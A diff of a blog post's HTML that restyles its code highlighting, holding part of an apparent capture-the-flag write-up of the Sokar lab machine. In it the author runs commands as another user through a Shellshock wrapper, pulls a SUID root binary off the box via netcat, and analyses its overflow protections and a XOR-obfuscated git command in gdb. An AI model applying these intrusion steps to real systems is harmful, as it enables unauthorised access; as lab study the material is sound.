+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;id&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
-<span style="color:#eedd82">uid</span>=501(apophis) <span style="color:#eedd82">gid</span>=502(apophis) <span style="color:#eedd82">groups</span>=502(apophis)
+uid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>502<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>502<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span>
 </code></pre></div><p>There we go! Command execution as <code>apophis</code> :) In <code>/home/apophis</code> there was a suid (for <code>root</code>) binary called <code>build</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;ls -lah /home/apophis&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;ls -lah /home/apophis&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;ls -lah /home/apophis&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;ls -lah /home/apophis&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
 total 36K
-drwx------  <span style="color:#f60">2</span> apophis apophis 4.0K Jan  <span style="color:#f60">2</span> 20:12 .
-drwxr-xr-x. <span style="color:#f60">4</span> root    root    4.0K Dec <span style="color:#f60">30</span> 19:20 ..
--rw-------  <span style="color:#f60">1</span> apophis apophis    <span style="color:#f60">9</span> Feb  <span style="color:#f60">2</span> 20:55 .bash_history
--rw-r--r--  <span style="color:#f60">1</span> apophis apophis   <span style="color:#f60">18</span> Feb <span style="color:#f60">21</span>  <span style="color:#f60">2013</span> .bash_logout
--rw-r--r--  <span style="color:#f60">1</span> apophis apophis  <span style="color:#f60">176</span> Feb <span style="color:#f60">21</span>  <span style="color:#f60">2013</span> .bash_profile
--rw-r--r--  <span style="color:#f60">1</span> apophis apophis  <span style="color:#f60">124</span> Feb <span style="color:#f60">21</span>  <span style="color:#f60">2013</span> .bashrc
--rwsr-sr-x  <span style="color:#f60">1</span> root    root    8.3K Jan  <span style="color:#f60">2</span> 17:49 build
+drwx------  <span style=color:#ae81ff>2</span> apophis apophis 4.0K Jan  <span style=color:#ae81ff>2</span> 20:12 .
+drwxr-xr-x. <span style=color:#ae81ff>4</span> root    root    4.0K Dec <span style=color:#ae81ff>30</span> 19:20 ..
+-rw-------  <span style=color:#ae81ff>1</span> apophis apophis    <span style=color:#ae81ff>9</span> Feb  <span style=color:#ae81ff>2</span> 20:55 .bash_history
+-rw-r--r--  <span style=color:#ae81ff>1</span> apophis apophis   <span style=color:#ae81ff>18</span> Feb <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2013</span> .bash_logout
+-rw-r--r--  <span style=color:#ae81ff>1</span> apophis apophis  <span style=color:#ae81ff>176</span> Feb <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2013</span> .bash_profile
+-rw-r--r--  <span style=color:#ae81ff>1</span> apophis apophis  <span style=color:#ae81ff>124</span> Feb <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2013</span> .bashrc
+-rwsr-sr-x  <span style=color:#ae81ff>1</span> root    root    8.3K Jan  <span style=color:#ae81ff>2</span> 17:49 build
 </code></pre></div><p>I thought I would copy this <code>build</code> binary off the box as I don’t exactly have a nice interactive shell to work with yet. <code>apophis</code> was also not able to to connect via <code>tcp/51242</code> outbound, which further confirmed my suspicions on the <code>user</code> module being used in iptables. I copied the binary to <code>/tmp/build</code> and pushed it out via netcat as <code>bynarr</code> (using my helper script) towards my local Kali linux install. Finally I had <code>build</code> locally to play with.</p>
 <p>I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
 Running it asked you if you wanted to &lsquo;build?':</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ ./build
-Build? (Y/N) Y
-Cloning into <span style="color:#87ceeb">&#39;/mnt/secret-project&#39;</span>...
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ ./build
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> Y
+Cloning into <span style=color:#e6db74>&#39;/mnt/secret-project&#39;</span>...
 ssh: Could not resolve hostname sokar-dev:: Name or service not known
 fatal: The remote end hung up unexpectedly
 </code></pre></div><p>That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for <code>apophis</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python apophis.py <span style="color:#87ceeb">&#34;echo Y | /home/apophis/build&#34;</span>
- * Executing /usr/bin/python -c <span style="color:#87ceeb">&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style="color:#87ceeb">&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python apophis.py <span style=color:#e6db74>&#34;echo Y | /home/apophis/build&#34;</span>
+ * Executing /usr/bin/python -c <span style=color:#e6db74>&#34;import time; time.sleep(2); print &#39;overdrive&#39;&#34;</span> | /usr/bin/python -c <span style=color:#e6db74>&#34;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&#34;</span>
 
 Password:
-Cloning into <span style="color:#87ceeb">&#39;/mnt/secret-project&#39;</span>...
+Cloning into <span style=color:#e6db74>&#39;/mnt/secret-project&#39;</span>...
 ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
 fatal: Could not read from remote repository.
 
 Please make sure you have the correct access rights
 and the repository exists.
-Build? (Y/N)
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span>
 </code></pre></div><p>The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to <code>/mnt/secret-project</code> from <code>sokar-dev</code> which does not resolve.</p>
-<h3 id="the-impossible-b0f">the impossible b0f</h3>
+<h3 id=the-impossible-b0f>the impossible b0f</h3>
 <p>I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to <code>build.</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ ./build
-Build? (Y/N) YY
-*** buffer overflow detected ***: ./build <span style="color:#eedd82">terminated</span>
-======= Backtrace: =========
-/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
-/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
-/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
-./build(main+0xea)[0x2b53e68e29d9]
-/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
-./build(+0x7d9)[0x2b53e68e27d9]
-======= Memory map: ========
-2b53e68e2000-2b53e68e3000 r-xp <span style="color:#f60">00000000</span> fe:00 <span style="color:#f60">667555</span>                     /root/sokar/build
-2b53e68e3000-2b53e68e7000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>
-2b53e6900000-2b53e6902000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>
-2b53e6ae2000-2b53e6ae3000 rwxp <span style="color:#f60">00000000</span> fe:00 <span style="color:#f60">667555</span>                     /root/sokar/build
-2b53e6ae3000-2b53e6b03000 r-xp <span style="color:#f60">00000000</span> fe:00 <span style="color:#f60">532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
-2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 <span style="color:#f60">532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
-2b53e6d03000-2b53e6d04000 rwxp <span style="color:#f60">00020000</span> fe:00 <span style="color:#f60">532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
-2b53e6d04000-2b53e6d05000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>
-2b53e6d05000-2b53e6e87000 r-xp <span style="color:#f60">00000000</span> fe:00 <span style="color:#f60">534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
-2b53e6e87000-2b53e7087000 ---p <span style="color:#f60">00182000</span> fe:00 <span style="color:#f60">534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
-2b53e7087000-2b53e708b000 r-xp <span style="color:#f60">00182000</span> fe:00 <span style="color:#f60">534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
-2b53e708b000-2b53e708c000 rwxp <span style="color:#f60">00186000</span> fe:00 <span style="color:#f60">534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
-2b53e708c000-2b53e7091000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>
-2b53e7091000-2b53e70a6000 r-xp <span style="color:#f60">00000000</span> fe:00 <span style="color:#f60">523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
-2b53e70a6000-2b53e72a6000 ---p <span style="color:#f60">00015000</span> fe:00 <span style="color:#f60">523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
-2b53e72a6000-2b53e72a7000 rwxp <span style="color:#f60">00015000</span> fe:00 <span style="color:#f60">523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
-2b53e886b000-2b53e888c000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>                          [heap]
-7fff340b7000-7fff340d8000 rwxp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>                          [stack]
-7fff341eb000-7fff341ed000 r-xp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>                          [vdso]
-ffffffffff600000-ffffffffff601000 r-xp <span style="color:#f60">00000000</span> 00:00 <span style="color:#f60">0</span>                  [vsyscall]
-[1]    <span style="color:#f60">18571</span> abort      ./build
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ ./build
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> YY
+*** buffer overflow detected ***: ./build terminated
+<span style=color:#f92672>=======</span> Backtrace: <span style=color:#f92672>=========</span>
+/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__fortify_fail+0x37<span style=color:#f92672>)[</span>0x2b53e6df5fe7<span style=color:#f92672>]</span>
+/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0xefea0<span style=color:#f92672>)[</span>0x2b53e6df4ea0<span style=color:#f92672>]</span>
+/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__gets_chk+0x195<span style=color:#f92672>)[</span>0x2b53e6df4df5<span style=color:#f92672>]</span>
+./build<span style=color:#f92672>(</span>main+0xea<span style=color:#f92672>)[</span>0x2b53e68e29d9<span style=color:#f92672>]</span>
+/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__libc_start_main+0xfd<span style=color:#f92672>)[</span>0x2b53e6d23ead<span style=color:#f92672>]</span>
+./build<span style=color:#f92672>(</span>+0x7d9<span style=color:#f92672>)[</span>0x2b53e68e27d9<span style=color:#f92672>]</span>
+<span style=color:#f92672>=======</span> Memory map: <span style=color:#f92672>========</span>
+2b53e68e2000-2b53e68e3000 r-xp <span style=color:#ae81ff>00000000</span> fe:00 <span style=color:#ae81ff>667555</span>                     /root/sokar/build
+2b53e68e3000-2b53e68e7000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
+2b53e6900000-2b53e6902000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
+2b53e6ae2000-2b53e6ae3000 rwxp <span style=color:#ae81ff>00000000</span> fe:00 <span style=color:#ae81ff>667555</span>                     /root/sokar/build
+2b53e6ae3000-2b53e6b03000 r-xp <span style=color:#ae81ff>00000000</span> fe:00 <span style=color:#ae81ff>532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 <span style=color:#ae81ff>532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d03000-2b53e6d04000 rwxp <span style=color:#ae81ff>00020000</span> fe:00 <span style=color:#ae81ff>532890</span>                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d04000-2b53e6d05000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
+2b53e6d05000-2b53e6e87000 r-xp <span style=color:#ae81ff>00000000</span> fe:00 <span style=color:#ae81ff>534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e6e87000-2b53e7087000 ---p <span style=color:#ae81ff>00182000</span> fe:00 <span style=color:#ae81ff>534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e7087000-2b53e708b000 r-xp <span style=color:#ae81ff>00182000</span> fe:00 <span style=color:#ae81ff>534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e708b000-2b53e708c000 rwxp <span style=color:#ae81ff>00186000</span> fe:00 <span style=color:#ae81ff>534538</span>                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e708c000-2b53e7091000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
+2b53e7091000-2b53e70a6000 r-xp <span style=color:#ae81ff>00000000</span> fe:00 <span style=color:#ae81ff>523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e70a6000-2b53e72a6000 ---p <span style=color:#ae81ff>00015000</span> fe:00 <span style=color:#ae81ff>523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e72a6000-2b53e72a7000 rwxp <span style=color:#ae81ff>00015000</span> fe:00 <span style=color:#ae81ff>523276</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e886b000-2b53e888c000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
+7fff340b7000-7fff340d8000 rwxp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
+7fff341eb000-7fff341ed000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
+ffffffffff600000-ffffffffff601000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                  <span style=color:#f92672>[</span>vsyscall<span style=color:#f92672>]</span>
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>    <span style=color:#ae81ff>18571</span> abort      ./build
 </code></pre></div><p>I slapped <code>build</code> into <code>gdb</code> to take a closer look at the potential overflow as well as the security features that <code>build</code> has been compiled with:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ gdb -q ./build
-Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ gdb -q ./build
+Reading symbols from /root/sokar/build...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
 gdb-peda$ checksec
 CANARY    : ENABLED
 FORTIFY   : ENABLED
@@ -718,38 +585,38 @@ NX        : disabled
 PIE       : ENABLED
 RELRO     : disabled
 </code></pre></div><p>:O The <code>CANARY</code> explains the failure in <code>__fortify_fail</code>. Disassembly of the <code>main</code> function reveals a call to <code>__gets_chk</code> which is responsible for the canary validation:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ disass main
-Dump of assembler code <span style="color:#f00">for</span> <span style="color:#f00">function</span> main:
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gdb-peda$ disass main
+Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
 
- [... snip ...]
+ <span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>
 
    0x00000000000009cc &lt;+221&gt;:   mov    esi,0x2
    0x00000000000009d1 &lt;+226&gt;:   mov    rdi,rbx
    0x00000000000009d4 &lt;+229&gt;:   call   0x760 &lt;__gets_chk@plt&gt;
-   0x00000000000009d9 &lt;+234&gt;:   lea    rsi,[rbp-0x30]
+   0x00000000000009d9 &lt;+234&gt;:   lea    rsi,<span style=color:#f92672>[</span>rbp-0x30<span style=color:#f92672>]</span>
    0x00000000000009dd &lt;+238&gt;:   mov    rdi,rbx
    0x00000000000009e0 &lt;+241&gt;:   call   0x790 &lt;strcmp@plt&gt;
    0x00000000000009e5 &lt;+246&gt;:   test   eax,eax
 
- [... snip ...]
+ <span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>
 </code></pre></div><p>It is possible that the original source was using <code>gets()</code> without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.</p>
 <p>I fiddled around a little more with the binary, and inspected the call to <code>encryptDecrypt</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ disass encryptDecrypt
-Dump of assembler code <span style="color:#f00">for</span> <span style="color:#f00">function</span> encryptDecrypt:
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gdb-peda$ disass encryptDecrypt
+Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> encryptDecrypt:
    0x00000000000008ac &lt;+0&gt;: mov    rdx,rdi
    0x00000000000008af &lt;+3&gt;: mov    r9d,0x0
    0x00000000000008b5 &lt;+9&gt;: mov    r11,0xffffffffffffffff
    0x00000000000008bc &lt;+16&gt;:    mov    r10,rdi
    0x00000000000008bf &lt;+19&gt;:    mov    eax,0x0
    0x00000000000008c4 &lt;+24&gt;:    jmp    0x8d6 &lt;encryptDecrypt+42&gt;
-   0x00000000000008c6 &lt;+26&gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
+   0x00000000000008c6 &lt;+26&gt;:    movzx  ecx,BYTE PTR <span style=color:#f92672>[</span>rdx+r8*1<span style=color:#f92672>]</span>
    0x00000000000008cb &lt;+31&gt;:    xor    ecx,0x49
-   0x00000000000008ce &lt;+34&gt;:    mov    BYTE PTR [rsi+r8*1],cl
+   0x00000000000008ce &lt;+34&gt;:    mov    BYTE PTR <span style=color:#f92672>[</span>rsi+r8*1<span style=color:#f92672>]</span>,cl
    0x00000000000008d2 &lt;+38&gt;:    add    r9d,0x1
    0x00000000000008d6 &lt;+42&gt;:    movsxd r8,r9d
    0x00000000000008d9 &lt;+45&gt;:    mov    rcx,r11
    0x00000000000008dc &lt;+48&gt;:    mov    rdi,r10
-   0x00000000000008df &lt;+51&gt;:    repnz scas al,BYTE PTR es:[rdi]
+   0x00000000000008df &lt;+51&gt;:    repnz scas al,BYTE PTR es:<span style=color:#f92672>[</span>rdi<span style=color:#f92672>]</span>
    0x00000000000008e1 &lt;+53&gt;:    not    rcx
    0x00000000000008e4 &lt;+56&gt;:    sub    rcx,0x1
    0x00000000000008e8 &lt;+60&gt;:    cmp    r8,rcx
@@ -757,253 +624,253 @@ Dump of assembler code <span style="color:#f00">for</span> <span style="color:#f
    0x00000000000008ed &lt;+65&gt;:    repz ret
 End of assembler dump.
 </code></pre></div><p>This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with <strong>I</strong> as the key over a string.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ee82ee">void</span> <span style="color:#ff0">encryptDecrypt</span>(<span style="color:#ee82ee">int</span> arg0, <span style="color:#ee82ee">int</span> arg1) {
-    rsi = arg1;
-    rdx = arg0;
-    LODWORD(r9) = <span style="color:#f60">0x0</span>;
-    r10 = arg0;
-    <span style="color:#f00">do</span> {
-            r8 = sign_extend_64(LODWORD(r9));
-            <span style="color:#f00">asm</span>{ repne scasb  };
-            <span style="color:#f00">if</span> (r8 &gt;= !<span style="color:#f60">0xffffffffffffffff</span> - <span style="color:#f60">0x1</span>) {
-                <span style="color:#f00">break</span>;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>encryptDecrypt</span>(<span style=color:#66d9ef>int</span> arg0, <span style=color:#66d9ef>int</span> arg1) {
+    rsi <span style=color:#f92672>=</span> arg1;
+    rdx <span style=color:#f92672>=</span> arg0;
+    LODWORD(r9) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>;
+    r10 <span style=color:#f92672>=</span> arg0;
+    <span style=color:#66d9ef>do</span> {
+            r8 <span style=color:#f92672>=</span> sign_extend_64(LODWORD(r9));
+            <span style=color:#66d9ef>asm</span>{ repne scasb  };
+            <span style=color:#66d9ef>if</span> (r8 <span style=color:#f92672>&gt;=</span> <span style=color:#f92672>!</span><span style=color:#ae81ff>0xffffffffffffffff</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1</span>) {
+                <span style=color:#66d9ef>break</span>;
             }
-            *(<span style="color:#ee82ee">int8_t</span> *)(rsi + r8) = LOBYTE(LODWORD(*(<span style="color:#ee82ee">int8_t</span> *)(rdx + r8) &amp; <span style="color:#f60">0xff</span>) ^ <span style="color:#f60">0x49</span>);
-            LODWORD(r9) = LODWORD(r9) + <span style="color:#f60">0x1</span>;
-    } <span style="color:#f00">while</span> (true);
-    <span style="color:#f00">return</span>;
+            <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int8_t</span> <span style=color:#f92672>*</span>)(rsi <span style=color:#f92672>+</span> r8) <span style=color:#f92672>=</span> LOBYTE(LODWORD(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>int8_t</span> <span style=color:#f92672>*</span>)(rdx <span style=color:#f92672>+</span> r8) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>) <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x49</span>);
+            LODWORD(r9) <span style=color:#f92672>=</span> LODWORD(r9) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1</span>;
+    } <span style=color:#66d9ef>while</span> (true);
+    <span style=color:#66d9ef>return</span>;
 }
 </code></pre></div><p>Running the binary in <code>gdb</code> and setting a breakpoint before the <code>system()</code> call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted <strong>and</strong> decrypted versions of the string to be executed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sokar <span style="color:#0f0"># gdb -q ./build</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sokar <span style=color:#75715e># gdb -q ./build</span>
 gdb-peda$ r
-Build? (Y/N) n
-OK :(
-[Inferior <span style="color:#f60">1</span> (process 4450) exited with code 06]
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> n
+OK :<span style=color:#f92672>(</span>
+<span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>process 4450<span style=color:#f92672>)</span> exited with code 06<span style=color:#f92672>]</span>
 Warning: not running or target is remote
 gdb-peda$ b *0x0000555555554a38
-Breakpoint <span style="color:#f60">1</span> at 0x555555554a38
+Breakpoint <span style=color:#ae81ff>1</span> at 0x555555554a38
 gdb-peda$ r
-Build? (Y/N) Y
-[----------------------------------registers-----------------------------------]
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> Y
+<span style=color:#f92672>[</span>----------------------------------registers-----------------------------------<span style=color:#f92672>]</span>
 RAX: 0x0
-RBX: 0x7fffffffe740 (<span style="color:#87ceeb">&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-RCX: 0x7ffff7b26e99 (&lt;setreuid+25&gt;: cmp    rax,0xfffffffffffff000)
-RDX: 0x7fffffffe7a0 (<span style="color:#87ceeb">&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style="color:#87ceeb">&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span>)
+RBX: 0x7fffffffe740 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+RCX: 0x7ffff7b26e99 <span style=color:#f92672>(</span>&lt;setreuid+25&gt;: cmp    rax,0xfffffffffffff000<span style=color:#f92672>)</span>
+RDX: 0x7fffffffe7a0 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;f&lt;:;f+ &#39;f. =i*%&amp;&#39;,i::!sff;&amp;&amp;=\t:&amp;\&#34;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if</span>$<span style=color:#e6db74>&#39;=f:,*;,=d9;&amp;#,*=f&#34;</span><span style=color:#f92672>)</span>
 RSI: 0x0
-RDI: 0x7fffffffe740 (<span style="color:#87ceeb">&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
+RDI: 0x7fffffffe740 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
 RBP: 0x7fffffffe830 --&gt; 0x0
-RSP: 0x7fffffffe740 (<span style="color:#87ceeb">&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span>)
-RIP: 0x555555554a38 (&lt;main+329&gt;:    mov    eax,0x0)
-R8 : 0x51 (<span style="color:#87ceeb">&#39;Q&#39;</span>)
-R9 : 0x51 (<span style="color:#87ceeb">&#39;Q&#39;</span>)
+RSP: 0x7fffffffe740 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&#34;</span><span style=color:#f92672>)</span>
+RIP: 0x555555554a38 <span style=color:#f92672>(</span>&lt;main+329&gt;:    mov    eax,0x0<span style=color:#f92672>)</span>
+R8 : 0x51 <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Q&#39;</span><span style=color:#f92672>)</span>
+R9 : 0x51 <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Q&#39;</span><span style=color:#f92672>)</span>
 R10: 0x0
 R11: 0x246
